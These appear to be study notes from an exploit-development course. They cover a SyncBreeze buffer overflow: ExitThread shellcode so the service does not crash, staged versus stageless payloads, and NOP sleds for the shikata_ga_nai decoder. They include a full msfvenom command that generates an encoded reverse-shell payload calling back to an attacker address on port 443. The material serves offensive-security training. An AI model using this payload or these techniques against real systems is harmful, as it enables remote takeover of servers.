### Improving the Exploit
> The default exit method of Metasploit shellcode following its execution is the ExitProcess API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the SyncBreeze service and causing it to crash.
If the program we are exploiting is a threaded application, and in this case it is, we can try to avoid crashing the service completely by using the ExitThread API instead, which will only terminate the affected thread of the program. This will make our exploit work without interrupting the usual operation of the SyncBreeze server, and will allow us to repeatedly exploit the server and exit the shell without bringing down the service.
To instruct msfvenom to use the ExitThread method during shellcode generation, we can use the EXITFUNC=thread option as shown in the command below:

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread(this parameter can't be put behind all other parameters-tested) -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  

### staged vs stageless
> The shells shown in this listing all have similar names. The key difference here is the separation after the architecture, of the payload names via a '/' or '_'. The payloads that are separated with a '/' character are staged payloads.6 Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. The benefit of a staged payload is that the size of the file is smaller. This may help with upload limitations on a target host. We will not be working with staged payloads, since that would require us to work with Metasploit.Payloads separated by an underscore (_) are stageless payloads.7 Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.

### NOP sled(verified less than 5 nops will reach page fault,as long as >=5, it is fine)
> As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side-effect of writing some data at and around the top of the stack. This eventually mangles at least a couple of bytes close to the address pointed at by the ESP register. Unfortunately, this small change on the stack is a problem for us because the decoder starts exactly at the address pointed to by the ESP register. In short, the GetPC routine execution ends up changing a few bytes of the decoder itself (and potentially the encoded shellcode), which eventually fails the decoding process and crashes the target process.One method to avoid this issue is to adjust ESP backwards, making use of assembly instructions such as DEC ESP, SUB ESP, 0xXX, before executing the decoder. Alternatively, we could create a wide "landing pad" for our JMP ESP, such that when execution lands anywhere on this pad, it will continue on to our payload. This may sound complicated, but we simply precede our payload with a series of No Operation (or NOP) instructions, which have an opcode value of 0x90. As the name suggests, these instructions do nothing, and simply pass execution to the next instruction. Used in this way, these instructions, also defined as a NOP sled or NOP slide, will let the CPU "slide" through the NOPs until the payload is reached.In both cases, by the time the execution reaches the shellcode decoder, the stack pointer points far enough away from it so as to not corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.
